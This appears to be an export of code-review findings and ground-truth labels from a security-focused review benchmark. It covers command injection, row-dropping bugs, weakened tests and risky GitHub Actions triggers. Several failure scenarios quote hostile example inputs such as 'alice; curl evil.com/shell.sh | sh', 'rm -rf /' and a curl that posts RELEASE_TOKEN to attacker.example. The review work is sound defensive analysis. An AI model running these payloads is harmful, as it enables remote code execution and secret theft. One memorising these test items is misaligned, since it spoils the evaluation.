findings.body: The change from a list-based subprocess.run call to a shell-interpolated f-string introduces an OS command injection vulnerability. When shell=True is used, the shell parses the entire command string, so any shell metacharacters in user_name (such as ';', '$(', or backticks) are executed as part of the command rather than treated as a literal argument. The previous list-based form passed user_name as a discrete argument, which prevented this.
findings.failure_scenario: An attacker provides a user_name value such as 'alice; rm -rf /' or 'alice; curl evil.com/shell.sh | sh'. Because shell=True interprets the full string, the injected command runs with the privileges of the application process, leading to arbitrary code execution, data exfiltration, or system compromise.
findings.title: Fix OS command injection via shell=True with interpolated user input

findings.body: The spec requires "Rendering shall preserve every input row in order." Returning `rows[1:]` silently drops the first input row, directly contradicting that SHALL requirement.
findings.failure_scenario: The first row of the input is silently dropped from the output, violating the spec's explicit SHALL requirement.
findings.title: Return all rows instead of dropping the first

findings.body: The test was changed from asserting exact row preservation to only checking that the result is not None. This near-assertion-free pattern would pass for any non-None return value, including an empty list or a single element, so it provides no regression protection. The old test would have caught the rows[1:] behavioral change; the new test does not.
findings.title: Restore meaningful assertion on return value instead of checking only non-None

findings.body: The user_name parameter is interpolated into a shell command string on the preceding line and executed with shell=True. An attacker who controls user_name can inject arbitrary shell commands (for example, a value like `alice; curl evil.com/shell.sh | bash`). The original code used a list of arguments which safely passes user_name as a single argument without shell interpretation. The command variable on the preceding line should also be removed.
findings.failure_scenario: A user name containing shell metacharacters such as `alice; rm -rf /` would be executed by the shell with the privileges of the running process, leading to arbitrary code execution.
findings.title: Replace shell=True subprocess call with argument list to prevent command injection

findings.body: The user-supplied `user` value is interpolated into a shell command string and executed via `sh -c`. An attacker who controls `user` can inject arbitrary shell commands (e.g. `alice; rm -rf /` or `alice$(curl evil.com/shell)`) that the shell will execute with the process's privileges. The previous code used `Command::new("report").args([...])`, which passes arguments directly to the executable without shell interpretation and is immune to this class of attack.
findings.failure_scenario: An attacker passes a `user` value containing shell metacharacters such as `;`, `|`, `&&`, or `$()`. The `sh -c` invocation interprets these as additional commands, leading to arbitrary code execution on the host.
findings.title: Remove shell interpolation of user-controlled input

findings.body: The spec states that rendering SHALL preserve every row. The new code calls `.skip(1)`, which silently drops the first row from the returned vector. This is the opposite of what the spec requires. The previous implementation returned `rows` unchanged, preserving every row.
findings.failure_scenario: A caller passes a vector of report rows and expects all of them back. The first row is silently discarded, so downstream consumers (reports, dashboards, audits) are missing data with no indication that a row was dropped.
findings.title: Remove `.skip(1)` to preserve every row as the spec requires

findings.body: The test was weakened from assert_eq! checking exact row preservation to assert! checking only non-emptiness. This means the test no longer catches the skip(1) bug in render_report. The function name was also changed from preserves_rows to returns_rows, reducing the specificity of what is verified.
findings.failure_scenario: With the weakened assertion, render_report could drop rows, reorder them, or add extra rows and the test would still pass, allowing regressions to go undetected.
findings.title: Restore exact row assertion to catch row-dropping bugs

findings.body: The user parameter is interpolated into a string via format! and passed to sh -c, allowing shell injection. An attacker controlling the user value can inject arbitrary commands through shell metacharacters such as semicolons, pipes, backticks, or $() substitution. The previous code used Command::new with separate args, which passes each argument directly to the process without shell interpretation.
findings.failure_scenario: A user value like "alice; rm -rf /" or "alice$(curl attacker.com/shell.sh|sh)" would be executed by the shell, leading to arbitrary command execution on the host system.
findings.title: Do not execute user input through a shell interpreter

findings.body: std::mem::uninitialized() is deprecated and was removed from the standard library in Rust 1.39. It produces undefined behavior for any type where not all bit patterns are valid — which includes bools, enums, references, NonZero types, and most structs containing them. Constructing a UserRecord from raw uninitialized memory and then reading or passing it to UserRecord::merge triggers UB at runtime: the process may crash, corrupt memory, or behave arbitrarily. This code will also fail to compile on any modern Rust toolchain.
findings.failure_scenario: When fetch_user is called, scratch is built from arbitrary stack/heap bits. If UserRecord contains any field with invalid bit patterns (e.g. a bool, an enum discriminator, or a reference), reading or moving scratch into UserRecord::merge causes undefined behavior — potentially crashing the process or corrupting adjacent memory.
findings.title: Replace std::mem::uninitialized() with MaybeUninit or a safe constructor

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message claims to "keep fetch_user source compatible", but the diff breaks the public API in two ways: the return type changes from UserRecord to (UserRecord, u64), and the timeout_ms parameter changes from Option<u64> to u64, removing the 30,000 default. Existing callers will fail to compile.
findings.failure_scenario: A caller invoking fetch_user with an Option<u64> argument or expecting a UserRecord return value will encounter a compile-time type mismatch after this change, breaking downstream code.
findings.title: Breaking API change contradicts "keep source compatible" intent

findings.anchor: /// Fetch one user while preserving the stable record return type.
findings.body: The doc comment was removed when the function signature changed. The new signature differs materially — timeout_ms is now required rather than Option<u64>, and the return type is now (UserRecord, u64) instead of UserRecord. Callers have no documentation describing the new parameters, return semantics, or behavior.
findings.suggestion: /// Fetch one user, returning the record and the timeout value used.
findings.title: Restore doc comment on public fetch_user function

findings.body: The old code used ProcessBuilder with separate arguments, which passes each argument as a distinct token to the OS and is immune to shell injection. The new code concatenates the untrusted user value into a shell command string passed to /bin/sh -c. An attacker who controls the user parameter can inject arbitrary shell commands (e.g. user=alice; curl evil.com/shell.sh | sh) that execute with the application's privileges.
findings.failure_scenario: A caller passes a username containing shell metacharacters such as '; rm -rf /' or backtick expressions. The shell interprets the injected payload as part of the command, leading to arbitrary code execution on the host running the application.
findings.title: Revert to ProcessBuilder to prevent command injection via the user parameter

findings.body: subList(1, rows.size()) throws IndexOutOfBoundsException when rows is empty, because fromIndex (1) is greater than toIndex (0). The previous code returned the empty list unchanged. Any caller passing an empty row list will now receive an unhandled exception instead of a result.
findings.failure_scenario: A caller invokes render with an empty list of rows. subList(1, 0) throws IndexOutOfBoundsException, crashing the request instead of returning an empty report.
findings.title: Guard against empty list to prevent IndexOutOfBoundsException from subList

findings.body: The original test asserted exact list equality, verifying that render returned all rows unchanged. The new test only asserts that the result is non-null, which would pass even if render returned an empty list, a single-element list, or a list with wrong contents. This weak assertion cannot catch the first-row-dropping regression introduced in the same change.
findings.title: Restore exact-equality assertion so the test validates row contents

findings.body: The original implementation called repository.loadMany(ids) once, performing a single batch query. The new implementation calls repository.load(id) inside a loop, issuing one database query per ID. With a large or attacker-controlled ids list this becomes an unbounded number of queries, enabling denial of service through database exhaustion.
findings.failure_scenario: An attacker supplies a list of thousands of IDs to the enrich endpoint. The loop issues thousands of individual repository.load() calls, overwhelming the database and causing service degradation or outage.
findings.title: Replace N+1 query loop with batch loadMany call

findings.body: The new per-id loop calls repository.load(id) and immediately invokes item.active() without checking whether load returned null. If any id does not exist in the repository, item will be null and item.active() throws a NullPointerException, aborting the entire enrich operation. The previous implementation delegated to repository.loadMany(ids), which likely handled missing ids internally or returned a complete list, so this null-risk is newly introduced by the change.
findings.failure_scenario: When enrich receives an id that does not exist in the repository, repository.load(id) returns null, item.active() dereferences null, and a NullPointerException propagates to the caller instead of returning the filtered result list.
findings.suggestion:
var item = repository.load(id);
      if (item == null) continue;
findings.title: Guard against null item from repository.load

findings.body: The original implementation loaded all ids in a single batch call via repository.loadMany(ids). The new code replaces this with a loop that calls repository.load(id) once per id, introducing an N+1 query pattern. For a list of N ids, this issues N individual repository calls instead of one batch call, which degrades performance linearly with the size of the input list.
findings.failure_scenario: When enrich receives a large list of ids, the per-id load loop issues one repository call per id instead of a single batch call, causing response time and database load to scale linearly with the number of ids.
findings.title: Replace per-id load loop with batch load to avoid N+1 queries

findings.body: Three independent conditions are expressed as nested `if` blocks, forcing the reader to track indentation depth. Each condition is a guard that can be expressed as an early `continue`, flattening the control flow and making the inclusion rule clearer.
findings.title: Flatten the nested conditionals with guard clauses

findings.body: The original `User` constructor was invoked with `(String id, int timeoutMs)`. The new code passes `new Date().toGMTString()`, which is a `String`, into the second constructor parameter. Unless `User` has an overloaded constructor accepting a `String` as the second argument, this will not compile. findings.failure_scenario: If `User` lacks a `(String, String)` constructor, compilation fails. If such a constructor exists, the timeout field is silently populated with a date string, causing downstream logic that interprets the second field as a timeout in milliseconds to behave incorrectly.

findings.failure_scenario: Callers invoking `fetch()` and assigning the result to a `User` variable will encounter a compile-time type mismatch, breaking builds that depend on the previous return contract.

findings.body: Switching from pull_request to pull_request_target runs this workflow in the base branch context with access to repository secrets. Combined with checking out the PR head (github.event.pull_request.head.sha) and passing RELEASE_TOKEN into the npm test environment, a malicious fork PR can exfiltrate the token. Under pull_request, fork workflows do not receive secrets; pull_request_target removes that isolation while still executing untrusted PR code.
findings.failure_scenario: An attacker opens a PR from a fork. The pull_request_target trigger gives the workflow access to secrets.RELEASE_TOKEN. The checkout of github.event.pull_request.head.sha pulls in the attacker's code. The npm test step runs that code with RELEASE_TOKEN in its environment, allowing the attacker to print or curl the token to an external server.
findings.title: Avoid pull_request_target with secrets and untrusted PR code

findings.body: Checking out the PR head while the workflow runs under pull_request_target means untrusted code executes with trusted permissions. Even if the trigger event is reverted, this ref line alone would still check out PR code — it should only be used with pull_request (not pull_request_target) or with additional safeguards like workflow_dispatch with pinning.
findings.failure_scenario: Combined with pull_request_target, this line causes the runner to execute attacker-controlled code from the PR while holding base-branch secrets. If the trigger is reverted to pull_request but this line remains alongside the RELEASE_TOKEN env var, the risk is lower (pull_request has no write secrets by default) but the pattern is still fragile and easy to misconfigure later.

findings.body: std::mem::uninitialized() constructs a UserRecord from uninitialized memory, which is undefined behavior for any type containing invalid bit patterns (bool, references, NonZero*, Option<&T>, etc.). It was deprecated in Rust 1.39.0. This can cause immediate crashes, memory corruption, or exploitable security vulnerabilities depending on UserRecord's field types.
findings.failure_scenario: If UserRecord contains any field that does not permit arbitrary bit patterns, constructing it via std::mem::uninitialized() triggers undefined behavior — potentially an immediate crash, silent memory corruption, or a security vulnerability that could be exploited.
findings.title: Replace std::mem::uninitialized() with MaybeUninit

findings.body: The uninitialized scratch value is passed directly into UserRecord::merge. If merge reads any field from scratch before fully overwriting it, or if merge's drop glue runs on the argument, undefined behavior occurs. This compounds the safety violation from the uninitialized allocation.
findings.failure_scenario: UserRecord::merge may read fields from scratch before writing them, or its destructor may run on uninitialized data when scratch goes out of scope, causing undefined behavior at runtime.
findings.title: Do not pass uninitialized memory into UserRecord::merge

findings.body: The user value is interpolated directly into a shell command string passed to sh -c. If user contains shell metacharacters such as ;, |, &&, backticks, or $(...), an attacker can inject and execute arbitrary commands. The previous version passed user as a discrete argument to Process.run, which is safe because the OS does not interpret it as a command. Revert the entire block: drop the command string, drop the sh invocation, and restore the direct Process.run call.
findings.failure_scenario: An attacker supplies a username such as alice; rm -rf / or alice$(curl evil.com/shell.sh|sh), the shell interprets the injected payload, and arbitrary commands execute with the application's privileges.
findings.title: Avoid shell interpolation of untrusted input

This provides no coverage for the sublist truncation, the shell invocation, or how user input is passed to the command, and would pass even if the function returned arbitrary data or skipped the command entirely.

findings.body: The function now returns rows.sublist(1) instead of rows, silently dropping the first element. The previous behavior preserved all rows. findings.failure_scenario: Callers expecting all rows receive one fewer element, causing downstream data loss or index errors when they assume the full list is present.
findings.title: Remove the sublist(1) call that drops the first row

findings.body: The code now interpolates the user value into a shell command string and executes it via `sh -c`. This directly violates the spec requirement that report commands pass user names as arguments without a shell, and introduces a command injection vulnerability: any shell metacharacters in the user value are interpreted by the shell.
findings.failure_scenario: A user name containing shell metacharacters such as `; rm -rf /` or `$(malicious)` is interpolated into the command string and executed by `sh -c`, allowing arbitrary command execution.
findings.title: Remove shell invocation and pass user as a direct argument

If ids is unbounded or influenced by an external caller without size validation elsewhere, this creates a denial-of-service vector through database query amplification. Verify that ids is size-bounded upstream, or restore batch loading with filtering applied after the batch fetch.

findings.body: User input is interpolated into a shell command string via concatenation. An attacker controlling the `user` argument can inject arbitrary shell commands (e.g. `alice; rm -rf /` or `alice$(curl attacker.com/shell.sh|sh)`). The original code passed `user` as a discrete argument to `exec.Command`, which is immune to shell injection because Go does not invoke a shell.
findings.failure_scenario: A caller passes a `user` value containing shell metacharacters such as `;` or `$()`. The shell interprets the injected payload and executes arbitrary commands with the privileges of the running process.
findings.title: Fix OS command injection in Render via shell interpolation

findings.body: Changing `return rows` to `return rows[1:]` drops the first element of the slice, directly contradicting the stated intent to "preserve report rows for named users". It also introduces a runtime panic when rows is empty or nil, because slicing from index 1 on a zero-length slice is out of bounds.
findings.failure_scenario: When Render is called with an empty slice `[]string{}`, `rows[1:]` panics with `runtime error: slice bounds out of range [:1] with capacity 0`, crashing the process. When called with any non-empty slice, the first row is silently lost.
findings.title: Return all rows instead of slicing from index 1

findings.body: The test was weakened from verifying that all rows are preserved (`len(got) != 2 || got[0] != "first"`) to only checking that the result is not nil. This passes even when the first row is dropped by `rows[1:]`, failing to catch the regression in report.go and contradicting the stated intent of preserving rows.
findings.failure_scenario: With the broken `rows[1:]` implementation, `Render("alice", []string{"first", "second"})` returns `["second"]` which is not nil, so the test passes despite the first row being lost.
findings.suggestion: if got := Render("alice", []string{"first", "second"}); len(got) != 2 || got[0] != "first" { t.Fatal(got) }
findings.title: Restore assertion that validates row preservation

findings.body: The test was rewritten to only assert that Render returns a non-nil slice. It no longer verifies the number of rows returned or their contents, so it would pass even if Render dropped, reordered, or altered elements. The changed code path now drops the first row via rows[1:], and the new test does not cover that behaviour.
findings.title: Strengthen the Render test to assert row count and contents

findings.body: The workflow was changed from `pull_request` to `pull_request_target`. Unlike `pull_request`, the `pull_request_target` event runs in the context of the base branch and grants the runner access to repository secrets and a token with the declared permissions. Combined with a third-party action (`actions/labeler@v6`), this creates a supply-chain attack surface: if the action is compromised or has a vulnerability, an attacker opening a PR from a fork could exfiltrate secrets or gain write access to the base repository. GitHub's security guidance recommends avoiding `pull_request_target` with third-party actions unless strictly necessary.
findings.failure_scenario: An attacker opens a pull request from a fork. The workflow triggers on `pull_request_target`, runs `actions/labeler@v6` with a token that has `contents: read` and `pull-requests: write`, and if the action is malicious or vulnerable, the attacker can steal repository secrets or modify the base branch.
findings.title: Use `pull_request` instead of `pull_request_target` to avoid secret exposure

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

An attacker who controls user_name can inject shell metacharacters (e.g. '; rm -rf /', '$(whoami)', backticks) to execute arbitrary OS commands with the application's privileges. The original code used subprocess.run with a list of arguments, which passes each argument separately and prevents injection.
findings.failure_scenario: When user_name contains shell metacharacters such as '; rm -rf /', the shell interprets them as command separators and executes the attacker's payload alongside the intended report command.
findings.title: Prevent OS command injection by using argument list instead of shell=True with interpolated input

findings.body: User-supplied `user_name` is interpolated into a shell command string and executed with `shell=True`. An attacker who controls `user_name` can inject arbitrary shell commands via metacharacters such as `;`, `|`, `&&`, or `$()`. The previous list-form call `subprocess.run(["report", "--user", user_name], ...)` was immune to this class of attack because arguments were passed directly to `exec` without shell interpretation.
findings.failure_scenario: An attacker passes `user_name='alice; curl evil.com/shell.sh | bash'`. With `shell=True`, the shell executes `report --user alice; curl evil.com/shell.sh | bash`, running arbitrary code on the server.

findings.body: The function now silently drops the first element of `rows`. The previous implementation returned the full list unchanged. This discards data without any indication to the caller, and the accompanying test was weakened to `is not None` so it no longer catches this regression.

The previous code used spawnSync with an argument array, which passes arguments directly to the executable without shell interpretation and is safe against injection. findings.body: execSync executes its argument through a shell, so interpolating the untrusted userName parameter into the command string allows shell metacharacters (e.g. ';', '$()', backticks) to inject arbitrary commands. The previous implementation used spawnSync with a discrete argument array, which is safe because arguments are passed directly to the child process without shell interpretation. Fixing this requires reverting to spawnSync (or execFileSync) with an argument array, which also means reverting the import on line 1 from execSync back to spawnSync.
findings.failure_scenario: An attacker supplies a userName such as '; rm -rf /' or '$(curl attacker.com/shell)', which the shell interprets, leading to arbitrary command execution in the reviewer process.
findings.title: Prevent OS command injection by passing arguments as an array

findings.body: `rows.slice(1)` removes the first element of the array, discarding data. The commit message states the intent is to "keep report output stable for named users", but this change makes the output unstable by dropping the first row. This contradicts both the stated intent and the original behavior.
findings.failure_scenario: When renderReport is called with ["first", "second"], it returns ["second"] instead of ["first", "second"], silently losing the first row of report data.
findings.title: Do not drop the first row from the rows array

findings.body: The test was weakened from an exact equality check to toBeTruthy(), so it no longer verifies that all rows are preserved. The production code now calls rows.slice(1), which drops the first row, and this regression is not caught by the test.
findings.title: Restore exact row-preservation assertion in the test

findings.body: Switching from spawnSync with an argument array to execSync with a template literal passes userName through a shell. If userName contains shell metacharacters (e.g., `;`, `|`, `$()`), they will be interpreted as shell commands, enabling arbitrary command injection. The import on line 1 also needs to change from `execSync` to `execFileSync` for the suggested fix to resolve.
findings.failure_scenario: A user name like `alice; rm -rf /` or `alice$(curl attacker.com)` would be executed by the shell, leading to arbitrary command execution on the server.
findings.title: Avoid shell interpolation of user input in execSync

findings.body: The `user` parameter is interpolated into a shell command string on the preceding line via `format!("report --user {user}")`, then passed to `sh -c`. This allows an attacker to inject arbitrary shell commands through shell metacharacters in the `user` value (e.g. `;`, `|`, `&&`, `$()`). The previous code used `Command::new("report").args(["--user", user])`, which passes `user` as a separate argument without shell interpretation. Remove the `format!` and restore the safe `Command` invocation with separate args.
findings.failure_scenario: An attacker supplies a username such as `alice; rm -rf /` or `$(curl attacker.com/shell.sh | sh)`, which the shell executes as part of the command string, leading to arbitrary code execution on the server.

findings.body: The user-supplied `user` value is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls `user` can inject arbitrary shell metacharacters (e.g. `; rm -rf /`) that will be executed by the shell. The previous version passed `user` as a separate argument to `Process.run`, which avoided this class of injection. Use argument-based invocation (`Process.run('report', ['--user', user])`) instead of string interpolation into a shell command.
findings.failure_scenario: When an attacker supplies a `user` value containing shell metacharacters such as `;`, `|`, or backticks, the injected payload is executed by the `sh -c` shell with the privileges of the running process.
findings.title: Use argument-based Process.run to prevent command injection

findings.body: The untrusted `user` parameter is concatenated directly into a shell command string passed to `/bin/sh -c`. An attacker who controls the `user` value can inject arbitrary OS commands (e.g. `alice; curl attacker.com/shell.sh | sh`). The original `ProcessBuilder` approach was safe because it passed `user` as a separate argument, preventing shell interpretation.
findings.failure_scenario: When an attacker supplies a crafted user value such as `alice; rm -rf /` or `alice && cat /etc/passwd > /tmp/leak`, the injected command executes with the application's privileges on the server.
findings.title: Prevent OS command injection in user parameter

findings.body: rows.subList(1, rows.size()) skips the element at index 0, dropping the first row from every report. When rows is empty, fromIndex=1 exceeds toIndex=0 and subList throws IllegalArgumentException. When rows has one element, it returns an empty list instead of that single element.
findings.failure_scenario: Calling render with an empty list throws IllegalArgumentException. Calling render with any list silently drops the first row, producing incorrect report output.
findings.title: Return full rows list instead of dropping first element

findings.body: The test was changed from assertEquals (which verifies exact row content) to assertNotNull (which only verifies the result is not null). This means the test no longer catches that the first row is dropped by subList(1, rows.size()), and it no longer validates the commit intent of "preserve report rows for named users."
findings.failure_scenario: The render method drops the first row via subList(1, rows.size()), but the weakened assertNotNull test passes regardless, allowing the regression to go undetected.
findings.title: Restore assertEquals to validate row preservation

ground_truth.commit_message: feat: preserve report rows for named users

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The commit states the intent is to preserve caller compatibility, but the method signature changed from `User fetch(String id, Integer timeoutMs)` to `Map.Entry<User, Integer> fetch(String id, int timeoutMs)`. The return type change breaks all callers expecting a `User` direct return. The parameter change from boxed `Integer` to primitive `int` removes the null-default-to-30000 behavior, breaking callers that relied on passing null.
findings.failure_scenario: Existing callers that assign the return value to a User variable will fail to compile or throw ClassCastException. Callers passing null for timeoutMs will fail to compile since primitive int cannot accept null.
findings.title: Preserve the User return type and nullable Integer timeoutMs parameter

findings.body: The original code passed `user` as a discrete argument to exec.Command, which the OS treats as a single argument with no shell interpretation. The new code interpolates `user` directly into a shell command string via `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands using metacharacters such as `;`, `|`, `&&`, backticks, or `$(...)`. For example, a `user` value of `alice; rm -rf /` would execute both the intended command and the injected payload.
findings.failure_scenario: An attacker supplies a `user` value containing shell metacharacters (e.g. `alice; curl attacker.com/shell.sh | sh`). The shell executes the injected command with the privileges of the running process, leading to arbitrary code execution.
findings.title: Fix OS command injection via untrusted user input in shell string

findings.body: The spec states that rendering shall preserve every row. Returning `rows[1:]` silently drops the first element of the slice, so the caller never sees the first row. This directly contradicts the preservation requirement and causes data loss for every rendered report.
findings.failure_scenario: A caller invokes Render with a slice of report rows. The first row is discarded before the slice is returned, so downstream consumers (UI, API response, file output) never receive it. The report is incomplete without any error or warning.
findings.title: Return all rows instead of dropping the first element

findings.body: The test was weakened from verifying that rows are preserved to only checking that the result is non-nil. This no longer detects the regression where the first row is dropped.

findings.body: The workflow trigger was changed from pull_request to pull_request_target, which runs in the context of the base branch and grants access to base-branch secrets. Combined with the checkout of github.event.pull_request.head.sha (the untrusted PR commit) and the exposure of RELEASE_TOKEN in the npm test environment, an attacker can craft a malicious PR that exfiltrates secrets. The workflow executes attacker-controlled code with access to repository secrets.
findings.failure_scenario: An attacker opens a PR with malicious test code or workflow modifications. When the workflow runs on pull_request_target, it checks out the attacker's PR code and runs npm test with RELEASE_TOKEN available in the environment. The attacker's code can exfiltrate the token via HTTP requests, log output, or any other available channel.
findings.title: CI/CD misconfiguration: pull_request_target with untrusted PR code execution

findings.body: The pull_request_target event runs with base-branch permissions and access to repository secrets. Checking out the PR head SHA isolates the code, but passing RELEASE_TOKEN as an environment variable to `npm test` exposes the secret to any code the test suite executes. A malicious PR can modify package.json scripts, test files, or dependencies to exfiltrate the token via curl, echo, or similar mechanisms.
findings.failure_scenario: An attacker opens a PR with a modified package.json test script that runs `curl -d "$RELEASE_TOKEN" https://attacker.example/steal`. The workflow triggers on pull_request_target, checks out the malicious code at the head SHA, and the npm test step executes the exfiltration script with access to the secret.
findings.title: Do not expose RELEASE_TOKEN to untrusted code in pull_request_target workflow

findings.body: pull_request_target runs the workflow in the context of the base branch with access to repository secrets and elevated privileges. Combined with actions/checkout@v4, which checks out the untrusted PR head under this trigger, a malicious fork PR can execute arbitrary code in the repository's CI environment. The added permissions block (pull-requests: write) further widens the blast radius. Unless labeling PRs from forks explicitly requires pull_request_target, this change introduces a serious code-injection vulnerability.
findings.failure_scenario: An attacker opens a fork PR containing malicious workflow files or poisoned source code. The workflow triggers on pull_request_target, checks out the attacker-controlled branch via actions/checkout@v4, and executes the malicious code with the repository's read contents and write pull-request permissions, enabling secret exfiltration or PR tampering.
findings.title: Revert to pull_request trigger to avoid code-injection risk

findings.body: The actions/labeler@v6 reference uses a mutable version tag that can be moved to point to a different commit. If the action's repository is compromised, a malicious update would be automatically pulled into every workflow run. Combined with the pull_request_target privileges, a compromised action would have access to repository secrets and write access to the base branch.
findings.failure_scenario: The actions/labeler repository is compromised and the v6 tag is updated to point to a malicious commit. The next workflow run fetches and executes the compromised action, which exfiltrates repository secrets or modifies the base branch using the pull_request_target privileges.
findings.title: Pin third-party GitHub Action to a full commit SHA

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

findings.body: The validation only blocks the exact string "0.0.0.0/0". An operator can set admin_cidr to "0.0.0.0/1", "128.0.0.0/1", or any other broad public CIDR and bypass the check, while the error message claims admin access cannot be public. The previous hardcoded value was a private RFC1918 range; introducing a variable with this porous guard weakens the safety guarantee.
findings.failure_scenario: An operator sets var.admin_cidr to "0.0.0.0/1" in a tfvars file. The validation passes because the string is not exactly "0.0.0.0/0", the security group rule allows SSH from half the public internet, and the error message gives a false sense of protection.
findings.title: Widen the CIDR validation to block all public ranges
